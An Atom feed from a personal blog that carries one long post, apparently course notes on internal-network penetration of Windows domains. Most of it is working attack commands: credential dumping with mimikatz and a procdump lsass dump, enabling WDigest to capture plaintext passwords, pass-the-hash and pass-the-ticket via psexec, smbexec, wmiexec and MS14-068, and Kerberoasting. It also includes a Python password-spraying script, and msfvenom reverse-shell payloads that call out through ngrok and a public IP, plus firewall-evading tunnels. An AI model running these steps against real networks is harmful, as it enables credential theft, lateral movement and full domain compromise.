<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Jrand-github.github.io</id>
    <title>F1n_blog</title>
    <updated>2021-06-28T06:50:44.364Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Jrand-github.github.io"/>
    <link rel="self" href="https://Jrand-github.github.io/atom.xml"/>
    <subtitle>每个人都在过着别人羡慕的生活</subtitle>
    <logo>https://Jrand-github.github.io/images/avatar.png</logo>
    <icon>https://Jrand-github.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, F1n_blog</rights>
    <entry>
        <title type="html"><![CDATA[内网渗透]]></title>
        <id>https://Jrand-github.github.io/post/nei-wang-shen-tou/</id>
        <link href="https://Jrand-github.github.io/post/nei-wang-shen-tou/">
        </link>
        <updated>2021-06-28T06:43:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="内网安全">内网安全</h1>
<p>[TOC]</p>
<h2 id="基本介绍">基本介绍</h2>
<figure data-type="image" tabindex="1"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210602084420936.png" alt="image-20210602084420936" loading="lazy"></figure>
<h2 id="信息收集">信息收集</h2>
<h3 id="github项目">Github项目</h3>
<pre><code>nishang
https://github.com/samratashok/nishang/releases/tag/v0.7.6

XenArmor(收集电脑密码)
https://www.sdbeta.com/wg/2020/0514/234852.html

LaZagne
https://github.com/AlessandroZ/LaZagne/releases

mimikatz
https://github.com/gentilkiwi/mimikatz/releases
</code></pre>
<h3 id="案例1-基本信息收集操作演示">案例1-基本信息收集操作演示</h3>
<pre><code>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备
systeminfo 详细信息*
net start 启动信息
tasklist 进程列表
schtasks 计划任务
</code></pre>
<h3 id="案例2-网络信息收集操作演示">案例2-网络信息收集操作演示</h3>
<pre><code>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备
nslookup 域名 追踪来源地址*
net view /domain 判断存在域*
net time /domain 判断主域*
netstat -ano 当前网络端口开放
ipconfig /all 判断存在域-dns 
</code></pre>
<h3 id="案例3-用户信息收集操作演示">案例3-用户信息收集操作演示</h3>
<pre><code>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试
系统默认常见用户身份：
Domain Admains：域管理员（默认对域控制器有完全控制权）
Domain Computers：域内机器
Domain Controllers：域控制器
Domain Guest：域访客，权限低
Domain users：域用户
Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权 ）

相关用户收集操作命令：
whoami /all 用户权限
net config workstation 登录信息
net user 当前电脑里面的用户（本地用户）
net localgroup 本地用户组
net user /domain 当前域里面的用户
net group /doamin 获取域用户组信息
wmic useraccount get /all 涉及域用户详细信息
net group &quot;Domain Admins&quot; /domain 查询域管理员账户
net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组
net group &quot;Domain Controllers&quot; /domain 查询域控制器
</code></pre>
<h3 id="案例4-凭据信息收集操作演示">案例4-凭据信息收集操作演示</h3>
<pre><code>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备
计算机用户HASH，明文获取-mimikatz（win），mimipenguin（linux ）

mimikatz：
1.测试域控权限 
2.导出所有用户口令 
3.维持域控权限


计算机各种协议服务口令获取-Lazagne（all），XenArmor（win）
Netsh WLAN show profiles
Netsh WLAN show profile name =&quot;无线名称&quot; key =clear


1.站点源码备份文件，数据库备份文件等
2.各类数据库WEB管理入口，如PHPmyadmin
3.浏览器保存密码，浏览器cookies
4.其他用户会话，3389和ipc$连接记录，回收站内容
5.windows 保存的WIFI密码
6.网络内部的各种账号和密码，如：Emain，VPN，FTP，OA等
</code></pre>
<h3 id="案例5-探针主机域控架构服务操作演示">案例5-探针主机域控架构服务操作演示</h3>
<p>CMD命令(ping)</p>
<pre><code>for /l %i in (1,1,255) do @ ping 192.168.52.%i -w 1 -n 1|find /i &quot;ttl=&quot;
</code></pre>
<p>powershell</p>
<pre><code>nishang
https://github.com/samratashok/nishang/releases/tag/v0.7.6

导入模块nishang
Import-Module .\nishang.psml

设置执行策略
set-ExecutionPolicy RemoteSigned

获取模块nishang的命令函数
Get-Command -Module nishang

获取常规计算机信息
Get-information

端口扫描（查看目录对应文件又演示语法，其他同理）
Invoke-Portscan -startaddress 192.168.3.0 -Endaddress
192.168.3.100 -ResolveHost -ScanPort

</code></pre>
<pre><code>empire
</code></pre>
<p>工具</p>
<pre><code>nmap masscan
</code></pre>
<p>meterpreter</p>
<pre><code>https://blog.csdn.net/forgetive/article/details/7664997
meterpreter&gt;run post/windows/gather/arp_scanner
</code></pre>
<h2 id="横向渗透">横向渗透</h2>
<figure data-type="image" tabindex="2"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210602224425808.png" alt="image-20210602224425808" loading="lazy"></figure>
<h3 id="github项目-2">GIthub项目</h3>
<pre><code>impacket工具包
https://gitee.com/RichChigga/impacket-examples-windows

Pstools官方工具包
https://docs.microsoft.com/en-us/sysinternals/downloads/pstools

ladon（k8gege开发的内网工具）
https://github.com/k8gege/Ladon

hashcat
https://github.com/hashcat/hashcat
</code></pre>
<h3 id="注意事项">注意事项</h3>
<pre><code>无法获取明文密码解决方案
Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码
Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码

针对以上情况，我们提供了4种方式解决此类问题

1.利用哈希hash传递(pth，ptk等)进行移动
2.利用其它服务协议(SMB,WMI等)进行哈希移动
3.利用注册表操作开启Wdigest Auth值进行获取
4.利用工具或第三方平台(Hachcat)进行破解获取

Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。

注册表操作开启Wdigest Auth值
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<h3 id="案例1-ipc域共享管道">案例1-IPC（域共享管道）</h3>
<pre><code>meterpreter导入mimikatz 很多时候会失败 最好自己上传
upload mimikatz.exe c:\\mimi.exe

提升权限
privilege::debug

获取明文密码
sekurlsa::LogonPasswords
</code></pre>
<p>获取到某域主机权限-&gt;  minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
<pre><code>IPC（ Internet Process Connection）是共享“命名管道”的资管，它是为了让进城间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。
利用流程：
 1.建立IPC链接到目标主机
 2.拷贝要执行的命令脚本到目标主机
 3.查看目标时间，创建计划任务（ at,schtasks ）定时执行拷贝到的脚本
 4.删除IPC链接
 net use \server\ipc$&quot;password&quot; /user:username # 工作组
 net use \server\ipc$&quot;password&quot; /user:domain\username #域内

 
 1.通过IPC读取C盘文件
 net K: \\192.168.52.138\c$
 
 2.查看文件列表
 dir \xx.xx.xx.xx\C$
 
 3.下载文件
 copy \xx.xx.xx.xx\C$\1.bat 1.bat 
 
 4.复制文件
  copy 1.bat \xx.xx.xx.xx\C$ 
 
 5. 查看对方共享
 net view xx.xx.xx.xx   
 
 6.删除IPC
 net use \xx.xx.xx.xx\C$\1.bat /del  
</code></pre>
<p>[at] &amp; [schtasks]</p>
<p>at &lt; Windows2012</p>
<pre><code>net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\ad
ministrator # 建立ipc连接：


copy add.bat \\192.168.3.21\c$  #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\add.bat   #添加计划任务
</code></pre>
<p>schtasks &gt;=Windows2012</p>
<pre><code>net use \192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\ad
ministrator # 建立ipc连接：


copy add.bat \192.168.3.32\c$ #复制文件到其C盘
schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
</code></pre>
<p>建立IPC常见的错误代码</p>
<pre><code>1. 5：错误访问，可能使用的不是管理员权限，需要先提升权限
2. 51：网络问题，windoows无法找到网络路径
3. 53：找不到网站路径，可能是IP地址错误，目标未开机，目标Lanmanserver服务未启动、有防火墙等问题
4. 67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$
5. 1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除
6. 1326：账号密码错误
7. 1792：目标NetLogon服务未启动，连接域控常常会出现此情况
8. 2242：用户密码过期，目标有账号策略，强制定期更改密码


建立IPC失败的原因
1. 目标系统不是NT或以上的操作系统
2. 对方没有打开IPC$共享
3. 对方未开启139,445端口，或者被防火墙屏蔽
4. 输出命令，账号密码有错误
</code></pre>
<h3 id="案例2-明文hash传递atexec-impacket">案例2-明文HASH传递atexec-impacket</h3>
<pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;
</code></pre>
<p>升级版-明文HASH传递批量利用-综合</p>
<pre><code>FOR /F %%i in (ips.txt) do net use \%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测IP对应明文连接
FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测IP对应明文回显版
FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版
FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版
</code></pre>
<p>升级版-明文HASH传递批量利用-升级版</p>
<pre><code>前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能吃西瓜？
net use \192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin
</code></pre>
<p>python脚本</p>
<pre><code class="language-python">import os,time
ips={
   '192.168.3.21',
   '192.168.3.25',
   '192.168.3.29',
   '192.168.3.30',
   '192.168.3.31',
   '192.168.3.33'
}

users={
   'Administrator',
   'boss',
   'dbadmin',
   'fileadmin',
   'mack',
   'mary',
   'vpnadm',
   'webadmin'
}
passs={
   'admin',
   'admin!@#45',
   'Admin12345'
}

for ip in ips:
   for user in users:
       for mima in passs:
           exec=&quot;net use \&quot;+ &quot;\&quot;+ip+'\ipc$ '+mima+' /user:god\'+user
           print('---&gt;'+exec+'&lt;---')
           os.system(exec)
           time.sleep(1)
</code></pre>
<pre><code>pip install pyinstaller
</code></pre>
<h3 id="案例5-procdumpmimikatz配合凭证获取">案例5-Procdump+Mimikatz配合（凭证获取）</h3>
<p>Mimikatz属于第三方软件，直接上传到目标主机可能被杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
<p>Procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>
<p>procdump 在目标机上执行</p>
<pre><code>procdump -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>mimikatz 在本地执行：（对应目标的mimikatz32位或64位）</p>
<pre><code>sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
</code></pre>
<h3 id="案例6-hashcat暴力破解ntlm-hash凭证获取">案例6-hashcat暴力破解NTLM Hash（凭证获取）</h3>
<p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
<p>hashcat -a 0 -m 1000 hash file --force</p>
<p>破解工具：https://github.com/hashcat/hashcat<br>
更多参考：https://www.freebuf.com/sectool/164507.html</p>
<h3 id="案例7-利用smb服务可以通过明文或hash传递">案例7-利用SMB服务可以通过明文或hash传递</h3>
<p>条件445服务端口开放</p>
<p>关于psexec进一步https://blog.csdn.net/tomyyyyyy/article/details/115782188</p>
<pre><code>psexec第一种：先有ipc链接，psexec需要明文或hash传递

net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator
psexec \\192.168.3.32 -s cmd # 需要先有ipc链接 -s以System权限运行

psexec第二种：不用建立IPC直接提供明文账户密码

psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
psexec -hashes :$HASH$ ./administrator@10.1.2.3
psexec -hashes :$HASH$ domain/administrator@10.1.2.3
psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32  // 实际操作中连接不上
// 以上两种方式使用的官方Pstools内的工具    
</code></pre>
<p>smbexec第三种：无需先ipc链接 明文或hash传递  非官方自带-参考impacket工具包使用，操作简单，容易被杀</p>
<pre><code>smbexec god/administrator:Admin12345@192.168.3.21
smbexec ./administrator:admin!@#45@192.168.3.32
smbexec -hashes :$HASH$ ./admin@192.168.3.21
smbexec -hashes :$HASH$ domain/admin@192.168.3.21
smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
</code></pre>
<p>Pstools官方工具包：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</p>
<p>impacket工具包下载：https://gitee.com/RichChigga/impacket-examples-windows</p>
<h3 id="案例8-wmi服务利用-cscriptwmiexecwmic">案例8-WMI服务利用-cscript,wmiexec,wmic</h3>
<p>WMI(Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。（可以执行命令）</p>
<p>第一种-自带WMIC命令 明文传递 无回显</p>
<pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c  ipconfig &gt;C:\1.txt&quot;
</code></pre>
<p>第二种-自带cscript配合wmiexec.vbs脚本 明文传递 有回显(wmiexec.vbs)</p>
<pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
</code></pre>
<p>第三种-第三方套件impacket wmiexec  明文或hash传递 有回显exe版本  容易被杀软查杀(wmiexec.exe)</p>
<p>https://blog.csdn.net/qq_27446553/article/details/46008473</p>
<pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;
wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;
wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;
</code></pre>
<p>wmiexec.vbs脚本下载</p>
<p>https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar</p>
<h3 id="案例9-横向移动pth-ntml传递">案例9-横向移动PTH NTML传递</h3>
<p>PTH(pass the hash) 利用LM或NTLM的值进行的渗透测试</p>
<p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现PTH攻击</p>
<p>总结：<code>KB2871997</code>补丁后的影响</p>
<pre><code>PTH：没打补丁用户都可以连接，打了补丁只能administrator连接
PTK：打了补丁才能用户都可以连接，采用aes256连接
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307170043249.png" alt="在这里插入图片描述" loading="lazy"></figure>
<p>未打补丁下的工作组及域连接：</p>
<pre><code>mimikatz 命令
privilege::debug           // #提升权限
sekurlsa::logonPasswords   // #抓取密码

sekurlsa::pth /user:administrator /domain:tencent /ntlm:2baaefbdd1ee80755b986ee93a8848b2
sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c
sekurlsa::pth /user:boss /domain:tencent /ntlm:ccef208c6485269c20db2cad21734fe7

上面反弹回来shell 查看域控的d盘信息
dir \\WIN-83V1721VG9V.tencent.com\d$    // 连接使用ip/域名都可以
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307181841429.png" alt="在这里插入图片描述" loading="lazy"></figure>
<p>2）PTK(pass the key) #利用的ekeys aes256进行的渗透测试</p>
<p>攻击方式同PTH，只是打了补丁后将NTML值换成aes256加密的值</p>
<p>3）PTT(pass the ticket) #利用的票据凭证TGT进行的渗透测试</p>
<p>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
<p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>
其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>
MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
<h3 id="案例10-横向移动ptk-ntml传递">案例10-横向移动PTK NTML传递</h3>
<p>打<code>KB2871997</code>补丁后的工作组及域连接:</p>
<pre><code>mimikatz 命令
privilege::debug           // 提升权限
sekurlsa::ekeys            // 获取aes

sekurlsa::pth /user:administrator /domain:tencent /aes256:f305f03562f81f7847f17bcf9477cce414fb47e4271763cf9078cc2566316e0f
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307184007412.png" alt="在这里插入图片描述" loading="lazy"></figure>
<h3 id="案例11-横向移动ptt哈希票据传递-ms14068kekeo本地">案例11-横向移动PTT哈希票据传递-ms14068&amp;kekeo&amp;本地</h3>
<h4 id="ms14-068">MS14-068</h4>
<p>powershell执行</p>
<p>能实现普通用户直接获取域控system权限</p>
<pre><code>1.查看当前sid 
whoami/user
2.清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
mimikatz # kerberos::purge         // 清空当前机器中所有凭证
mimikatz # kerberos::list          // 查看当前机器凭证
mimikatz # kerberos::ptc 票据文件   // 将票据注入到内存中
3.利用ms14-068生成TGT数据 
ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码
MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45
4.票据注入内存
mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit
5.查看凭证列表 
klist
6.利用  
dir \\192.168.3.21\c$
</code></pre>
<p>MS14-068下载：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p>
<h4 id="利用工具kekeo">利用工具kekeo</h4>
<p>工具kekeo下载：https://github.com/gentilkiwi/kekeo/releases</p>
<pre><code>1.生成票据
kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;
2.导入票据
kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
3.查看凭证 klist
4.利用net use载入
dir \\192.168.3.21\c$
</code></pre>
<h3 id="伪造本地票据ptt">伪造本地票据（PTT）</h3>
<p>这种方式是猜测当前电脑连接过域控，并且连接时长没有超过票据的过期时间（10小时）</p>
<p>mimikatz 命令</p>
<pre><code>privilege::debug           // 提升权限
sekurlsa::tickets /export   // 导出本地所有票据
kerberos::ptt xxxxxxxxxx.xxxx.kirbi  // 导入票据 
dir \\192.168.3.21\c$   // 利用
</code></pre>
<h3 id="案例12-rdp协议传递">案例12-RDP协议传递</h3>
<p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
<p>RDP明文密码链接</p>
<pre><code>windows: mstsc 
mstsc.exe /console /v:192.168.3.21 /admin
linux: rdesktop 192.168.3.21:3389
</code></pre>
<p>RDP密文密码链接</p>
<p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了<code>2871997</code>、<code>2973351</code>补丁也支持；开启命令：</p>
<pre><code>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
mstsc.exe /restrictedadmin

mimikatz.exe
privilege::debug
sekurlsa::pth /user:administrator /domain:tencent /ntlm:2baaefbdd1ee80755b986ee938848b2 &quot;/run:mstsc.exe /restrictedadmin&quot;
</code></pre>
<h3 id="案例13-kerberoast攻击spn扫描">案例13-Kerberoast攻击(SPN扫描)</h3>
<p>spn扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p>
<pre><code>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。



Kerberoast攻击过程：

1.攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证 ，该TGT认购权证用于以后的ST服务票据请求。

2.攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。

3.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。

4.攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。
</code></pre>
<p>1）探针服务</p>
<pre><code>setspn -q */*
setspn -q */* | findstr &quot;MSSQL&quot;
</code></pre>
<p>2）请求获取票据</p>
<p>删除缓存票据</p>
<pre><code>klist purge
</code></pre>
<pre><code>第一种 powershell请求
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;

第二种 mimikatz请求

mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;
</code></pre>
<p>查看票据</p>
<pre><code>klist
</code></pre>
<p>3）导出票据</p>
<p>mimikatz</p>
<pre><code>mimikatz.exe &quot;kerberos::list /export&quot;
</code></pre>
<p>4）破解票据</p>
<p>破解工具tgsrepcrack.py   python3环境运行</p>
<pre><code>python tgsrepcrack.py passwd.txt xxxx.kirbi
python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi
</code></pre>
<p>5）重写票据</p>
<pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512

mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
</code></pre>
<p>6）利用</p>
<pre><code>dir //xxx.xxx.xxx.xxx/c$
</code></pre>
<h3 id="案例14-sam文件hash值获取">案例14-sam文件hash值获取</h3>
<pre><code>privilege::debug
token::elevate
lsadump::sam
</code></pre>
<h4 id="登录认证-netbios">登录认证（ netbios）</h4>
<p>system权限可以模拟</p>
<p>ke'r'bo</p>
<h2 id="权限维持">权限维持</h2>
<h2 id="代理技术">代理技术</h2>
<pre><code>解决内网通信问题
</code></pre>
<h3 id="案例1-内网穿透ngrok测试演示-两个内网通讯上线">案例1-内网穿透Ngrok测试演示-两个内网通讯上线</h3>
<p>链接：<code>ngrok.cc</code></p>
<p>kali</p>
<pre><code>./sunny clientid aa0676878c162ffc 
</code></pre>
<p>生成木马(基于http协议)</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.76.132
set lport 4444
exploit
</code></pre>
<h3 id="案例2-内网穿透frp自建跳板测试-两个内网通讯上线">案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</h3>
<p>链接：<code>gofrp.org</code></p>
<p>kali</p>
<pre><code>服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）
服务器修改配置文件frps.ini：
 [common]
 bind_port = 6677
 启动服务端：
 ./frps -c ./frps.ini
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.160.211 lport=6000 -f exe -o frp.exe
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 127.0.0.1
 set LPORT 5555
 exploit
</code></pre>
<p>控制端-下载-解压-修改-启动</p>
<pre><code>控制端修改配置文件frpc.ini：
 [common]
 server_addr = 你的云主机ip
 server_port = 6677        #frpc工作端口，必须和上面frps保持一致
 [msf]
 type = tcp
 local_ip = 127.0.0.1
 local_port = 5555          #转发给本机的5555
 remote_port = 6000         #服务端用6000端口转发给本机


</code></pre>
<h2 id="隧道技术">隧道技术</h2>
<pre><code>必备知识点：
 1.代理和隧道技术区别?
 2.隧道技术为了解决什么?
 3.隧道技术前期的必备条件？
 在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截
 CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等

在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。
 常用的隧道技术有以下三种：
 网络层：IPv6 隧道、ICMP 隧道
 传输层：TCP 隧道、UDP 隧道、常规端口转发
 应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道
</code></pre>
<h3 id="案例1-网络传输应用层检测连通性-检测">案例1-网络传输应用层检测连通性-检测</h3>
<pre><code>1. TCP 协议
    用“瑞士军刀”——netcat
    执行 nc 命令：nc  &lt;端口&gt;
2. HTTP 协议
    用“curl”工具，执行curl &lt;IP地址:端口&gt;命令。如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息
3. ICMP 协议
    用“ping”命令，执行ping &lt;IP地址/域名&gt;
4. DNS 协议
    检测DNS连通性常用的命令是“nslookup”和“dig”
    nslookup 是windows自带的DNS探测命令
    dig是linux系统自带的DNS探测命令
</code></pre>
<h3 id="案例2-网络层icmp隧道ptunnel使用隧道技术">案例2-网络层ICMP隧道ptunnel使用(隧道技术)</h3>
<p>pingtunnel</p>
<pre><code>tcp/udp/sock5流量伪装成icmp流量进行转发的工具 -p  ##表示连接icmp隧道另一端的机器IP（即目标服务器） -lp ##表示需要监听的本地tcp端口 -da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP） -dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口） -x  ##设置连接的密码
</code></pre>
<p>使用方式</p>
<pre><code>./ptunnel -x xiaodirdesktop 127.0.0.1 1080
</code></pre>
<p>被控端</p>
<pre><code>./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080
</code></pre>
<p>老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)<br>
新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版)</p>
<h3 id="案例3-传输层转发隧道portmap使用">案例3-传输层转发隧道Portmap使用</h3>
<pre><code>windows: lcxlinux：portmaplcx -slave 攻击IP 3131 127.0.0.1 3389 //将本地3389给攻击IP的3131lcx -listen 3131 3333 //监听3131转发至3333
</code></pre>
<p>windows自带</p>
<pre><code>将来自333端口的流量全部转发到192.168.191.130的3389端口netsh interface portproxy add v4tov4 listenport=333 connectaddress=192.168.191.130 connectport=3389netsh interface portproxy show all 查看所有转发规则netsh interface portproxy delete v4tov4 listenport=333 删除转发规则netsh interface portproxy reset 清除所有规则
</code></pre>
<h3 id="案例4-应用层dns隧道配合cs上线">案例4-应用层DNS隧道配合CS上线</h3>
<p>https://www.freebuf.com/articles/web/256032.html</p>
<p>https://zhuanlan.zhihu.com/p/90806965</p>
<p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
